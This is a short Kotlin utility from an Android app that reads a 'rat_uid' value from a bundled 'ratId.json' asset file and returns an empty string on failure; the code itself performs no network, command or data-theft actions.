package com.app.cyber

import android.content.Context
import org.json.JSONObject

object Utils {
    fun getRatUid(ctx: Context): String {
        return try {
            val raw = ctx.assets.open("ratId.json").bufferedReader().use { it.readText() }
            JSONObject(raw).optString("rat_uid", "")
        } catch (e: Exception) {
            ""
        }
    }
}
